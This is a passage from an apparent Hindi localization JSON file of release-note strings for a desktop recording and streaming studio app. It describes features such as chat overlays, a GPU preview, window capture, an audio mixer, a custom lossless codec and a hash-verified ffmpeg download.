रिकॉर्डिंग में एक चैप्टर जोड़ती है (mkv चैप्टर, या दूसरे कंटेनर के लिए एक पढ़ने योग्य साइडकार)। प्लेटफ़ॉर्म की ओर के स्ट्रीम मार्कर के लिए खाते वाले API चाहिए — जो चार्टर के अनुसार बाहर हैं, और ऐप में यह ईमानदारी से बताया गया है।","changelog.9ee401a2a83a":"<strong>लाइव चैट ओवरले</strong> (TASK-613) — आने वाली लाइवस्ट्रीम चैट का कैनवस पर एक पारदर्शी, समय-मुहर वाला रिकॉर्ड (उपयोगकर्ता नाम + संदेश + 12-घंटे का टाइमस्टैम्प)। <strong>अंतिम उपयोगकर्ता को YouTube या Twitch के लिए कभी कोई API कुंजी, डेवलपर खाता या साइन-इन नहीं चाहिए:</strong> YouTube ऐप के अपने InnerTube क्लाइंट से ठीक वेब प्लेयर की तरह पढ़ा जाता है, Twitch गुमनाम IRC से पढ़ा जाता है, और Kick अपने सार्वजनिक एंडपॉइंट से poll किया जाता है। चैट की बाढ़ सिर्फ़ पुरानी पंक्तियों को बाहर करती है — यह कभी स्ट्रीम, रिकॉर्डिंग या ओवरले को रोक नहीं सकती।","changelog.fcfab0e66cef":"<strong>तैरती प्रतिक्रियाओं का ओवरले</strong> (TASK-614) — दर्शकों के रिएक्शन इमोजी ऊपर उठते और धुँधले होते हैं, <strong>प्रोग्राम में ही शामिल होकर</strong> (रिकॉर्ड और स्ट्रीम दोनों होते हैं), ऐप के भीतर के रिएक्शन बार से या उसी बिना-कुंजी वाले चैट इनजेस्ट में पहचाने गए; सीमित पार्टिकल पूल का मतलब है कि रिएक्शन की बाढ़ सिर्फ़ यह सीमित करती है कि स्क्रीन पर कितना दिखे।","changelog.b7f3aacf8907":"टाला गया (ईमानदारी से)","changelog.d7babe268df3":"<strong>वर्चुअल-कैमरा की गहराई</strong> (TASK-611) — असली वर्चुअल कैमरा एक साइन किया हुआ OS ड्राइवर कंपोनेंट है (उसका अपना माइलस्टोन)। फ़ीड मॉडल (प्रोग्राम / वर्टिकल / एक सोर्स) और हर OS का ट्रांसपोर्ट सीम अभी शिप होते हैं; बटन निष्क्रिय रहता है और उसके टूलटिप में पूरी बात बताई गई है।","changelog.d1bbc34e384f":"<strong>ब्राउज़र सोर्स</strong> (TASK-612) — एक डिज़ाइन स्पाइक (<code>design/browser-source-spike.md</code>) सुझाता है कि CEF जैसा एम्बेड ज़रूरत पड़ने पर डाउनलोड होने वाले कंपोनेंट के रूप में शिप किया जाए (ffmpeg की तरह); फ़ैसला Mike का है।","changelog.39e93c6d3eb9":"[0.70.0] — 2026-07-06 (स्ट्रीमिंग + स्टूडियो MVP — पहली सार्वजनिक रिलीज़)","changelog.2b4289185858":"वह स्टूडियो जिससे आप लाइव जा सकते हैं: एक-लक्ष्य RTMP/RTMPS स्ट्रीमिंग, स्टूडियो मोड + GPU ट्रांज़िशन, ग्लोबल हॉटकी, प्रोफ़ाइल + सीन संग्रह, एक असली स्टैट्स डॉक — और चरण R से मर्ज किया गया पूरा P2P <strong>रिमोट मेहमान</strong> सहयोग।","changelog.1ab82763e794":"<strong>एक-लक्ष्य स्ट्रीमिंग</strong> (Twitch/YouTube/Kick/Facebook/Trovo/कस्टम पर RTMP/RTMPS), गोपनीय और छिपाकर दिखाई जाने वाली स्ट्रीम कुंजी, री-कनेक्ट backoff, और लाइव जाएँ पर अपने-आप रिकॉर्डिंग के साथ; लोकल रिकॉर्डिंग पर स्ट्रीम की स्थिति का कभी असर नहीं पड़ता।","changelog.5d254b2963c1":"<strong>स्टूडियो मोड + GPU ट्रांज़िशन</strong> — एक लाइव प्रीव्यू पैन और एक commit ट्रांज़िशन (कट/फ़ेड/स्लाइड/ स्वाइप/luma), जिसे दर्शक देखते हैं।","changelog.a95243dac70b":"<strong>ग्लोबल हॉटकी</strong> (रिकॉर्ड / लाइव जाएँ / ट्रांज़िशन) और एक <strong>असली स्टैट्स डॉक</strong> (fps / छूटे फ़्रेम / render-ms + इस प्रोसेस का CPU% / मेमोरी)।","changelog.1bff268c26f0":"<strong>प्रोफ़ाइल + सीन संग्रह</strong> — बदली जा सकने वाली सेटिंग्स + सीन स्नैपशॉट, जो रीस्टार्ट के बाद भी याद रहते हैं।","changelog.3e3cc955eb95":"<strong>रिमोट मेहमान (चरण R)</strong> — ऑप्ट-इन P2P/WebRTC रिमोट सहयोग: समय-सीमा वाले आमंत्रण लिंक, मिक्सर में मेहमान का माइक, दो-गेट म्यूट, वक्ता को हाइलाइट करें, स्क्रीन-और-कोने वाला लेआउट, और उपयोगकर्ता का अपना ऑप्ट-इन TURN रिले (लेखक का चलाया कोई इन्फ़्रास्ट्रक्चर नहीं)।","changelog.2fd6b77c5ce7":"[0.56.0] — 2026-07-06 (नेटिव GPU प्रीव्यू + विंडो कैप्चर में सुधार)","changelog.6536f40e75b5":"प्रीव्यू अब <strong>Windows, macOS और Linux</strong> पर OBS जैसा <em>महसूस</em> होता है: कंपोज़िटर का GPU आउटपुट बिना किसी read-back/encode चक्कर के सीधे स्क्रीन पर बनाया जाता है — और विंडो कैप्चर लाइव थंबनेल से चुनता है, रीस्टार्ट के बाद भी बना रहता है, और ख़ुद ही ठीक हो जाता है।","changelog.c5202dd3e1c5":"जोड़ा गया — Windows, macOS और Linux पर नेटिव GPU प्रीव्यू (&quot;OBS जैसा अनुभव&quot;)","changelog.b77d015fe905":"<strong>एक zero-copy नेटिव GPU प्रीव्यू सरफ़ेस</strong>, जो read-back → JPEG → canvas वाले प्रीव्यू की जगह लेता है और कंपोज़िटर का अपना GPU आउटपुट सीधे स्क्रीन पर बनाता है — कोई encode चक्कर नहीं, कोई देरी नहीं। हर OS पर: <strong>Windows</strong> पर एक <strong>DirectComposition</strong> सरफ़ेस (DX12 पर wgpu <code>SurfaceTargetUnsafe::CompositionVisual</code>), जो WebView2 के <em>ऊपर</em> कंपोज़ होता है, <strong>हार्डवेयर पर रीयल-टाइम में सत्यापित</strong>; <strong>macOS</strong> पर WKWebView के ऊपर एक <strong>CAMetalLayer</strong> (Metal); <strong>Linux</strong> पर एक X11 चाइल्ड विंडो जो <strong>Vulkan/GL</strong> सरफ़ेस चलाती है (Wayland पर फ़िलहाल JPEG प्रीव्यू ही है)। तीनों का <strong>रेंडर होना CI में साबित है</strong> — स्क्रीनशॉट smoke परीक्षण हर push पर असली पिक्सेल जाँचता है। इंटरैक्टिव <strong>चयन बॉक्स + ट्रांसफ़ॉर्म हैंडल ख़ुद GPU फ़्रेम में ही बनाए जाते हैं</strong> (सिर्फ़ प्रीव्यू में — कभी रिकॉर्ड या स्ट्रीम नहीं होते)। अंदर GPU स्टैक को <strong>wgpu 0.20 → 27 में अपग्रेड किया गया</strong>। JPEG प्रीव्यू सार्वभौमिक विकल्प के रूप में बना रहता है और जब भी नेटिव सरफ़ेस संभव न हो (गैर-DX12 Windows GPU, Wayland, खोया हुआ सरफ़ेस), अपने-आप लौट आता है।","changelog.0f1a68ade361":"जोड़ा गया — लाइव थंबनेल वाला विंडो पिकर, जो हर विंडो की सूची दिखाता है","changelog.dc9f6df8df56":"<strong>विंडो कैप्चर पिकर अब हर खुली विंडो का लाइव थंबनेल दिखाता है</strong> — असली कैप्चर किए गए फ़्रेमों का एक टाइल ग्रिड, जो पिकर खुला रहने तक ताज़ा होता रहता है (अलग-अलग समय पर, ताकि खोलते ही बैकएंड पर एक साथ बोझ न पड़े), एक मैनुअल रीफ़्रेश बटन के साथ। थंबनेल <strong>IPC पर मेमोरी में रखे JPEG <code>data:</code> URI के रूप में जाते हैं — डिस्क पर कभी कुछ नहीं लिखा जाता</strong>, इसलिए पिकर बंद होते ही वे ग़ायब हो जाते हैं।","changelog.3519efd99c8a":"<strong>मिनिमाइज़ की गई विंडो भी सूची में आती हैं</strong> (पहले उन्हें छाँट दिया जाता था): Windows आइकन बनी विंडो के लिए उसके पुनर्स्थापित आकार का सहारा लेता है, macOS स्क्रीन से बाहर की विंडो गिनता है, और Linux/X11 उन्हें पहले से दिखाता था। एक समर्पित <strong>विंडो-गणना CI जॉब</strong> दो विंडो खोलता है, एक को मिनिमाइज़ करता है, और जाँचता है कि दोनों दिखें।","changelog.87f9b12b0ac3":"<strong>Windows का पीला कैप्चर बॉर्डर हट गया है</strong> — Windows.Graphics.Capture सत्र अब बिना बॉर्डर का अनुरोध करते हैं (जितना संभव हो; जो पुराने Windows बिल्ड इसका समर्थन नहीं करते, उनमें पुराना व्यवहार बना रहता है)।","changelog.a153cea5d4be":"जोड़ा गया — रीस्टार्ट पर फिर से जुड़ने वाला विंडो कैप्चर + अपने-आप रिकवरी","changelog.3e74cf2927b9":"**ऐप फिर से लॉन्च करने पर विंडो कैप्चर <em>उसी</em> विंडो से फिर से जुड़ जाता है<strong> — ठीक वैसे ही जैसे OBS Studio करता है। OS का विंडो हैंडल (Windows <code>HWND</code>, macOS <code>CGWindowID</code>, X11 XID) सिर्फ़ एक सत्र के लिए मान्य होता है, इसलिए सहेजा गया विंडो सोर्स अब विंडो की </strong>स्थायी पहचान<strong> भी रखता है — उसका executable / मालिक ऐप, उसकी विंडो क्लास और उसका शीर्षक — और शुरू होने पर </strong>उस पहचान से मिलान करके लाइव विंडो को फिर से ढूँढता है**, ऐप को आधार बनाकर, ताकि वह कभी किसी असंबंधित प्रोग्राम से न जुड़े (एक ही ऐप की कई विंडो के बीच क्लास + शीर्षक से फ़ैसला होता है)। पुराने सहेजे गए सीन की सिर्फ़-हैंडल वाली id अब भी लोड होती हैं। <em>Windows हार्डवेयर पर सत्यापित है; macOS (ScreenCaptureKit) और Linux/X11 वही मिलान करने वाला कोड साझा करते हैं और CI में सत्यापित हैं; Wayland पर कोई असर नहीं — उसका सिस्टम portal सोर्स को फिर से चुनता है और पहले से स्थायी है।</em>","changelog.55f49748f04d":"<strong>त्रुटि वाले कैप्चर अपने-आप ठीक हो जाते हैं।</strong> कोई डिस्प्ले / विंडो / वीडियो कैप्चर सोर्स, जो इसलिए विफल हुआ क्योंकि उसकी विंडो, मॉनिटर या कैमरा अभी मौजूद नहीं था, <strong>अपने-आप फिर से आज़माया जाता है</strong> (हर सोर्स के लिए exponential backoff, 3 s से दोगुना होते हुए 60 s तक), इसलिए जैसे ही विंडो फिर से खुलती है या डिवाइस फिर से जुड़ता है, वह लाइव हो जाता है — मैनुअल &quot;फिर से कोशिश करें&quot; की ज़रूरत नहीं (ज़रूरत पड़ने पर धक्का देने के लिए वह बटन बना रहता है)। स्क्रीन-पिकर portal और मीडिया सोर्स को नहीं छुआ जाता।","changelog.e0a0ac02515e":"<strong>सत्र के बीच बंद होने वाली कैप्चर की गई विंडो अब भरोसेमंद ढंग से पहचानी जाती है।</strong> कुछ elevated / ट्रे में छिपने वाले ऐप के लिए Windows का capture-closed इवेंट कभी नहीं आता, जिससे सोर्स अपने आख़िरी फ़्रेम पर &quot;लाइव&quot; होकर जमा रह जाता; अब कैप्चर ख़ुद विंडो हैंडल पर भी नज़र रखता है और जैसे ही विंडो सचमुच चली जाती है, त्रुटि दिखाता है — और ठीक यही ऊपर वाली अपने-आप रिकवरी को सक्रिय करता है।","changelog.67f786726842":"<strong>माउस कर्सर अब विंडो कैप्चर में ट्रैक होता है — विंडो फ़ोकस में हो या नहीं।</strong> Windows कर्सर को सिर्फ़ <em>फ़ोकस वाली</em> विंडो के कैप्चर में ही कंपोज़ करता है (बिना फ़ोकस वाली विंडो को कर्सर नहीं मिलता, और उसकी सामग्री स्थिर रहने पर कोई फ़्रेम भी नहीं मिलता), इसलिए जिस कैप्चर किए गए ऐप पर आप क्लिक नहीं कर रहे थे, वह जमा हुआ लगता था। Freally Capture अब <strong>कर्सर ख़ुद बनाता है</strong>, ठीक वैसे ही जैसे OBS करता है — असली कर्सर आकृतियाँ (alpha, क्लासिक mask और inverting कर्सर), लाइव ट्रैक होकर फ़्रेम में कंपोज़ होती हैं, और जब सिर्फ़ कर्सर हिला हो तब भी फ़्रेम बनाए जाते हैं। हार्डवेयर पर मापा गया: बिना फ़ोकस वाली विंडो ~0 अपडेट से बढ़कर <strong>तेज़ गति पर 55 fps / होवर की गति पर 32 fps</strong> तक पहुँची। <strong>डिस्प्ले कैप्चर</strong> को भी यही सुधार मिला: बाक़ी डेस्कटॉप स्थिर रहने पर भी रिकॉर्डिंग में कर्सर चलता रहता है।","changelog.768c67ad0574":"[0.55.0] — 2026-07-03 (ऑडियो मिक्सर + रिकॉर्डिंग)","changelog.82a067a13f56":"0.55.0 वाला पायदान <strong>चरण 3 (ऑडियो मिक्सर + फ़िल्टर)</strong> और <strong>चरण 4 (रिकॉर्डिंग)</strong> है — स्टूडियो अब अपनी प्रोग्राम फ़ीड को मिक्स कर सकता है और डिस्क पर <strong>रिकॉर्ड</strong> कर सकता है, मल्टी-ट्रैक, सबसे अच्छे उपलब्ध हार्डवेयर एनकोडर या ऐप के अपने लॉसलेस कोडेक के साथ।","changelog.6550f4141d88":"जोड़ा गया — रिकॉर्डिंग (चरण 4)","changelog.8f276d78647e":"<strong>ऐप का अपना <code>freally-video</code> (<code>.frec</code>) लॉसलेस कोडेक</strong> (<code>fcap-encode</code>): लोकल रिकॉर्डिंग का डिफ़ॉल्ट फ़ॉर्मैट, यहीं लिखा गया और <strong>पूरी तरह अपना</strong> — समय के साथ फ़्रेम के अंतर + PNG-शैली की बाएँ-पिक्सेल भविष्यवाणी + ऐप का अपना byte-aligned <strong>FLZ</strong> (LZ77) चरण; हर तकनीक या तो दशकों पहले पेटेंट-मुक्त हो चुकी है या public-domain है, <strong>शून्य निर्भरताएँ, कुछ भी डाउनलोड नहीं</strong>, <code>#![forbid(unsafe_code)]</code>। कंटेनर पूर्ण सैंपल स्थितियों के साथ <strong>6 तक इंटरलीव्ड स्टीरियो PCM ट्रैक</strong> रखता है (बनावट से ही A/V सिंक + बिना अंतराल का पॉज़), ~2 s के अंतराल पर intra फ़्रेम, एक सीक इंडेक्स, और एक <strong>कटी हुई फ़ाइल झेलने वाला रीडर</strong> (क्रैश हुई रिकॉर्डिंग अपने आख़िरी पूरे खंड तक चलती है; दूषित इनपुट त्रुटि देता है, कभी panic नहीं करता, और शत्रुतापूर्ण फ़ाइलों से बचाव के लिए आवंटन सीमित है)। रीयल-टाइम में सत्यापित: एक कृत्रिम 1080p60 एनकोड अपने बजट में रहता है।","changelog.8d5c44a0b1af":"<strong>एनकोडर पहचान + एनकोडर कैटलॉग</strong>: एक <code>wgpu</code> GPU प्रोब (vendor id + नाम के आधार पर अनुमान, सॉफ़्टवेयर rasterizer छोड़ दिए जाते हैं) हर OS के लिए पेशकश के नियम तय करता है — Windows पर <strong>NVENC / Quick Sync / AMF</strong>, Linux पर <strong>NVENC / VAAPI</strong> (render-node पर निर्भर), macOS पर <strong>VideoToolbox</strong> — हमेशा सार्वभौमिक <strong>x264 / x265 / AV1</strong> CPU विकल्पों के साथ। हार्डवेयर एनकोडर ईमानदार उम्मीदवारों के रूप में पेश किए जाते हैं और पहली बार इस्तेमाल पर <strong>एक असली 3-फ़्रेम smoke एनकोड से पुष्ट</strong> किए जाते हैं (समर्थन GPU + ड्राइवर के अनुसार बदलता है); हर wire एनकोडर अपनी ffmpeg निर्भरता का लेबल दिखाता है।","changelog.14fd14e34068":"<strong>मल्टी-ट्रैक muxing, कंटेनर और फ़ाइल विभाजन</strong>: <strong>mp4 / mkv / mov / webm</strong> (wire कोडेक) या ऐप के अपने <strong><code>.frec</code></strong> (लॉसलेस) में रिकॉर्ड करें, <strong>6 तक ऑडियो ट्रैक</strong> के साथ, और स्वतंत्र रूप से चलने योग्य खंडों में <strong>अपने-आप फ़ाइल विभाजन</strong>। रिकॉर्डिंग इंजन एक सख़्त CFR घड़ी चलाता है (फ़्रेम की गिनती रिकॉर्ड किए गए समय से बँधी), इसलिए रुकावटों के दौरान भी A/V सिंक में रहता है और <strong>पॉज़/फिर से शुरू करना एक ही चलने योग्य फ़ाइल के भीतर बिना अंतराल के होता है</strong>। मुख्य रिकॉर्डिंग को इस तरह बनाया गया है कि वह स्ट्रीम की स्थिति से बेपरवाह चलती रहे (स्ट्रीमिंग 0.70.0 में आती है), और उसके लिए एक <strong>अलग-ट्रैक वाली लोकल कॉपी</strong> सहेजी जाती है।","changelog.a153199fe59d":"<strong>साफ़ लेबल वाला, ज़रूरत पड़ने पर डाउनलोड होने वाला ffmpeg ब्रिज</strong> (<code>fcap-encode::ffmpeg</code>): पेटेंट से बँधे wire कोडेक (H.264/AAC/HEVC/AV1) ffmpeg के ज़रिए चलते हैं, जो <strong>कभी बंडल नहीं</strong> किया जाता। पहली बार इस्तेमाल पर इसे <strong>हर OS के लिए पिन किए गए बिल्ड</strong> से डाउनलोड किया जाता है (URL + <strong>सोर्स में दर्ज SHA-256</strong>, जिसे प्रकाशक के अपने checksum से मिलाया गया है), <strong>कुछ भी चलने से पहले हैश से सत्यापित</strong> किया जाता है (मेल न खाने पर इंस्टॉल रद्द हो जाता है), निकाला जाता है (सिर्फ़ एक सदस्य — लिखने के लिए आर्काइव के पाथ कभी इस्तेमाल नहीं होते), और एक <strong>अलग प्रोसेस</strong> के रूप में चलाया जाता है (जिससे इसका LGPL/GPL लाइसेंस भी ऐप से अलग रहता है)। एक साफ़ लेबल वाला <strong>कंपोनेंट</strong> पैनल दिखाता है कि यह क्या है, क्यों है, पिन किया गया सोर्स कौन-सा है, और लाइव %/कुल-में-से/MB/s प्रगति; ऐप के अपने <code>.frec</code> वाले रास्ते को इनमें से किसी की ज़रूरत नहीं।","changelog.823a023c395e":"<strong>HEVC / AV1 रिकॉर्डिंग + रिकॉर्डिंग के बाद remux</strong>: HEVC और AV1 लेबल किए गए ffmpeg रास्ते से रिकॉर्ड होते हैं (जहाँ GPU समर्थन करे वहाँ हार्डवेयर पर); एक <strong>रिकॉर्डिंग</strong> सूची (नियंत्रण → फ़ाइलें…) पूरी हो चुकी फ़ाइलें सबसे नई पहले दिखाती है और <strong>MP4 में रीमक्स करें</strong> का विकल्प देती है (mkv → mp4, <code>-c copy</code>, कोई री-एनकोड नहीं, faststart, HEVC पर <code>hvc1</code> टैग)। remux कमांड जाँचता है कि पाथ रिकॉर्डिंग फ़ोल्डर के भीतर ही है — webview उसे कभी मनमानी फ़ाइलों की ओर नहीं मोड़ सकता।","changelog.8f8423224424":"<strong>एनकोडर सेटिंग्स + प्रीसेट</strong> (सेटिंग्स → आउटपुट): रेट कंट्रोल <strong>CBR / VBR / CQP</strong> + बिटरेट + कीफ़्रेम अंतराल, हर एनकोडर के लिए <strong>गुणवत्ता / संतुलित / प्रदर्शन</strong> प्रीसेट (हर परिवार के अपने नियंत्रण पर मैप किए गए), हर ट्रैक का ऑडियो बिटरेट, और एक क्लिक वाले <strong>लॉसलेस / उच्च गुणवत्ता / संतुलित</strong> रिकॉर्ड प्रीसेट। डॉक में रिकॉर्डिंग नियंत्रण: <strong>शुरू / रोकें / ठहराएं / फिर से शुरू करें</strong>, अवधि (ठहराव को छोड़कर) + ट्रैक गिनती के साथ एक धड़कता <strong>REC</strong> संकेतक, और पिछले सत्र की फ़ाइलें या उसकी ईमानदार त्रुटि।","changelog.a6dabb1cab06":"<strong>मीडिया सोर्स</strong> (<code>fcap-sources::media</code>) — चरण 2 से यहाँ लाया गया: कैनवस पर कंपोज़ की गई एक वीडियो/इमेज फ़ाइल, <strong>जिसका ऑडियो मिक्सर में है</strong>। स्थिर इमेज एक बार डिकोड होती हैं (इमेज सोर्स की तरह); <strong><code>.frec</code> ऐप के अपने कोडेक से चलती है</strong>, कुछ भी डाउनलोड किए बिना; wire फ़ॉर्मैट लेबल किए गए ffmpeg कंपोनेंट से डिकोड होते हैं (<code>-hwaccel auto</code> हार्डवेयर डिकोड, सॉफ़्टवेयर विकल्प, लूप/रीस्टार्ट), और एक stop वॉचडॉग का मतलब है कि अटका हुआ डिकोडर कभी स्टूडियो को नहीं अटका सकता। मीडिया का ऑडियो एक नए <strong>मीडिया-ऑडियो हब</strong> से होकर बहता है, ताकि किसी मीडिया क्लिप को बिना किसी विशेष मामले के पूरी मिक्सर स्ट्रिप (फ़ेडर, फ़िल्टर, ट्रैक, सिंक ऑफ़सेट) मिले।","changelog.78a7ab9818b8":"जोड़ा गया — ऑडियो मिक्सर (चरण 3)","changelog.bb86ddd81916":"<strong>ऐप का अपना ऑडियो इंजन</strong> (<code>fcap-audio</code>): एक <code>cpal</code> कैप्चर ग्राफ़, जो भीतर सब कुछ 10 ms ब्लॉक में <strong>48 kHz पर स्टीरियो f32</strong> के रूप में चलाता है। हर सोर्स के लिए <strong>माइक्रोफ़ोन / लाइन-इन</strong> (ऑडियो इनपुट) और <strong>डेस्कटॉप / सिस्टम ऑडियो</strong> (ऑडियो आउटपुट) कैप्चर, हर एक का फ़ॉर्मैट बदलकर और <strong>ऐप के अपने streaming linear resampler</strong> से इंजन की घड़ी पर resample करके। डेस्कटॉप ऑडियो के बारे में हर OS पर ईमानदारी से बताया गया है: <strong>Windows</strong> <strong>WASAPI loopback</strong> से किसी भी आउटपुट डिवाइस को कैप्चर करता है; <strong>Linux</strong> PipeWire/PulseAudio का <strong>monitor</strong> डिवाइस इस्तेमाल करता है; <strong>macOS</strong> को एक वर्चुअल loopback डिवाइस (जैसे BlackHole) की ज़रूरत है, जब तक ScreenCaptureKit का ऑडियो रास्ता नहीं आता — पिकर यह बताते हैं और जाने-पहचाने वर्चुअल डिवाइस छाँटकर दिखाते हैं।","changelog.4541b9b25062":"<strong>मिक्सिंग ग्राफ़</strong>: हर सोर्स के लिए <strong>सिंक-ऑफ़सेट डिले → फ़िल्टर चेन → पुश-टू-टॉक / पुश-टू-म्यूट / म्यूट / फ़ेडर</strong>, जो <strong>6 तक ट्रैक बसों</strong> (हर सोर्स का असाइनमेंट), <strong>प्रोग्राम (मास्टर)</strong> मिक्स और एक <strong>मॉनिटर</strong> मिक्स में भेजा जाता है। हर म्यूट/PTT/फ़ेडर बदलाव पर क्लिक-रहित ~8 ms गेन स्मूदिंग। पूरा कोर शुद्ध और <strong>डिवाइस-मुक्त है — हर रूटिंग नियम हार्डवेयर के बिना यूनिट-टेस्ट किया गया है</strong>।","changelog.805988055894":"<strong>ऐप का अपना क्लासिक-DSP फ़िल्टर समूह — चार्टर के अनुसार कहीं भी ML नहीं</strong>: <strong>डीनॉइज़</strong> (ऐप के अपने radix-2 FFT के साथ STFT स्पेक्ट्रल दमन — 512-सैंपल √Hann फ़्रेम, 50% ओवरलैप, हर bin के noise-floor की ट्रैकिंग + स्पेक्ट्रल घटाव; स्थिर शोर घटता है जबकि बोली गुज़र जाती है), <strong>नॉइज़ गेट</strong> (hysteresis + hold), <strong>कंप्रेसर</strong> (peak-sensing, make-up गेन), <strong>लिमिटर</strong> (तुरंत अटैक, सख़्त सीमा के साथ), <strong>3-बैंड EQ</strong> (RBJ shelf/peak biquad), <strong>गेन</strong>, और साइडचेन <strong>डकिंग</strong> (एक सोर्स को दूसरे के नीचे दबाना)। हर प्रोसेसर को बचाव के तौर पर सीमित किया गया है, ताकि हाथ से संपादित कोई सीन बेक़ाबू स्थिति न बना सके।","changelog.d379afe46aba":"<strong>मॉनिटरिंग, डकिंग, PTT/PTM और LUFS</strong>: किसी भी डिवाइस पर एक <strong>मॉनिटर आउटपुट</strong> (सीमित, underrun से सुरक्षित); ट्रिगर सोर्स के लाइव envelope से चलने वाली साइडचेन डकिंग; ग्लोबल हॉटकी के ज़रिए <strong>पुश-टू-टॉक / पुश-टू-म्यूट</strong> (मॉडल से पंजीकृत, और Wayland पर ग्लोबल हॉटकी न होने के बारे में ईमानदार); प्रोग्राम मिक्स पर एक <strong>BS.1770 K-weighted LUFS</strong> मीटर (momentary + short-term); हर सोर्स का peak/RMS मीटरिंग।","changelog.df9eeebe72aa":"<strong>ऑडियो मिक्सर पैनल</strong>: सक्रिय सीन के हर ऑडियो सोर्स के लिए एक <strong>चैनल स्ट्रिप</strong> — नाम + स्थिति, एक <strong>VU मीटर</strong> (हरा→पीला→लाल, peak निशान), एक <strong>Fader</strong> (−60…+6 dB), <strong>म्यूट</strong>, एक <strong>मॉनिटर</strong> चक्र, एक <strong>ऑडियो-फ़िल्टर</strong> डायलॉग (सभी 7 फ़िल्टर, डकिंग के लिए ट्रिगर पिकर के साथ), <strong>ट्रैक बिंदु 1–6</strong>, और एक उन्नत पॉपओवर (सिंक ऑफ़सेट + PTT/PTM हॉटकी)। एक <strong>LUFS</strong> रीडआउट और एक <strong>मॉनिटर-डिवाइस</strong> पिकर (सेटिंग्स में सहेजा जाता है)। ऑडियो सोर्स, सोर्स रेल में वीडियो जैसे ही लाइव स्थिति बिंदुओं के साथ दिखते हैं, और <strong>स्रोत जोड़ें</strong> मेन्यू में हर OS के लिए ईमानदार डिवाइस पिकर के साथ।","changelog.97f0a5a2c868":"सीन/सोर्स मॉडल (<code>fcap-scene</code>) में <strong>ऑडियो इनपुट / ऑडियो आउटपुट</strong> सोर्स प्रकार और हर सोर्स के लिए एक <strong><code>AudioSettings</code></strong> स्ट्रिप (फ़ेडर, म्यूट, मॉनिटर मोड, ट्रैक bitmask, सिंक ऑफ़सेट, PTT/PTM हॉटकी, ऑडियो फ़िल्टर की क्रमबद्ध चेन) जुड़ते हैं — serde round-trip परीक्षण किया गया, camelCase wire-जाँच, सीमा में बँधा, और लोड पर ख़ुद ठीक होने वाला (ऑडियो की स्थिति ठीक उन्हीं सोर्स पर मौजूद होती है जो ऑडियो संभाल सकते हैं)।","changelog.417eeb2ed567":"सुरक्षा / गोपनीयता","changelog.9fd51762b5f0":"रुख़ नहीं बदला है और फिर से सत्यापित किया गया है: कैप्चर किया गया ऑडियो + कंपोज़ किए गए फ़्रेम <strong>सिर्फ़</strong> मिक्सर, उपयोगकर्ता द्वारा चुने गए मॉनिटर डिवाइस, <strong>रिकॉर्डिंग फ़ाइल</strong> और वर्चुअल कैमरा तक जाते हैं — <strong>मशीन से बाहर कुछ नहीं जाता</strong>, न कोई खाता, न टेलीमेट्री। सेटिंग्स में सहेजा गया मॉनिटर-डिवाइस का नाम लंबाई/आकार से सत्यापित होता है; हॉटकी accelerator मॉडल में आने से पहले पार्स/सत्यापित किए जाते हैं।","changelog.ce84fae75efe":"<strong>इस पायदान में जुड़ी एकमात्र नेटवर्क क्रिया उपयोगकर्ता के स्पष्ट क्लिक पर होने वाला ffmpeg डाउनलोड है</strong> — TLS पर, एक <strong>हार्डकोड किए गए, हर OS के लिए पिन किए गए URL</strong> से, <strong>बाइनरी के कभी भी चलने से पहले SHA-256 से सत्यापित</strong>, और एक अलग प्रोसेस के रूप में चलाया जाता है। यह कभी अपने-आप शुरू नहीं होता; checksum मेल न खाने पर इंस्टॉल रद्द हो जाता है। ऐप के अपने <code>.frec</code> रिकॉर्डिंग रास्ते में कोई नेटवर्क कॉल ही नहीं होता।","changelog.bafa8e1e2feb":"रिकॉर्डिंग इंजन के ffmpeg ऑडियो ट्रैक <strong>सिर्फ़-loopback (<code>127.0.0.1</code>) सॉकेट</strong> पर चलते हैं, जो ठीक एक कनेक्शन स्वीकार करके बंद हो जाते हैं; रिकॉर्डिंग सेटिंग्स (एनकोडर id, कंटेनर, बिटरेट, फ़ोल्डर, फ़ाइल नाम) इस्तेमाल से पहले <strong>सीमा/आकार के लिए सत्यापित</strong> होती हैं, और <strong>remux/रिकॉर्डिंग की क्रियाएँ रिकॉर्डिंग फ़ोल्डर तक सीमित हैं</strong> (canonicalize किए गए parent की जाँच), ताकि webview मनमानी फ़ाइलों तक न पहुँच सके। <code>.frec</code>/मीडिया पार्सर फ़ाइल के बाइट्स को <strong>अविश्वसनीय</strong> मानते हैं — आवंटन सीमित है, और दूषित इनपुट पर panic करने के बजाय त्रुटि देते हैं।","changelog.ab6195393730":"नई थर्ड-पार्टी निर्भरताएँ, सभी <code>THIRD-PARTY-NOTICES.md</code> में दर्ज: <strong><code>tauri-plugin-global-shortcut</code></strong> (पुश-टू-टॉक/म्यूट), और ffmpeg-ब्रिज के डाउनलोड/सत्यापन/अनपैक वाला समूह (<strong><code>ureq</code></strong> + rustls, <strong><code>sha2</code></strong>, <strong><code>zip</code></strong>, <strong><code>tar</code></strong> + <strong><code>lzma-rs</code></strong>), साथ में <strong><code>chrono</code></strong> (लोकल-समय वाले फ़ाइल नाम)। ऑडियो DSP और <strong><code>freally-video</code></strong> कोडेक <strong>पूरी तरह ऐप के अपने</strong> हैं; ffmpeg को <strong>चलाया जाता है, कभी बंडल नहीं किया जाता</strong>।","changelog.282c879e15bb":"<strong>लाइव-हार्डवेयर ऑडियो smoke परीक्षण</strong> (headless CI पर <code>--ignored</code> रखे गए) और साथ में release-mode में <code>.frec</code> 1080p60 एनकोड की एक सुरक्षा-सीमा; ऐप के भीतर ffmpeg डाउनलोड → सत्यापन → रिकॉर्ड → वापस चलाने का पूरा फ़्लो चरण 4 का रिलीज़ smoke परीक्षण है।","changelog.78915e8e8933":"[0.40.0] — 2026-07-02 (कंपोज़िटर + सीन/सोर्स)","changelog.64aed5d4e90f":"<strong>ऐप का अपना wgpu GPU कंपोज़िटर</strong> (<code>fcap-compositor</code>): हर दिखने वाला सीन आइटम पीछे से आगे की ओर प्रोग्राम फ़्रेम में कंपोज़ होता है, हर आइटम के <strong>खिसकाने/स्केल/घुमाने/क्रॉप</strong> के साथ (एक आधिकारिक, यूनिट-टेस्ट किया गया ट्रांसफ़ॉर्म), सभी सात <strong>ब्लेंड मोड</strong> (normal/additive/subtract/screen/multiply/ lighten/darken, fixed-function ब्लेंड स्थितियों के रूप में), बिना CPU swizzle के stride-aware BGRA/RGBA अपलोड, और एक headless readback रास्ता। golden परीक्षण असली GPU पिक्सेल जाँचते हैं और बिना adapter वाली मशीनों पर स्पष्ट सूचना के साथ छोड़ दिए जाते हैं; हार्डवेयर 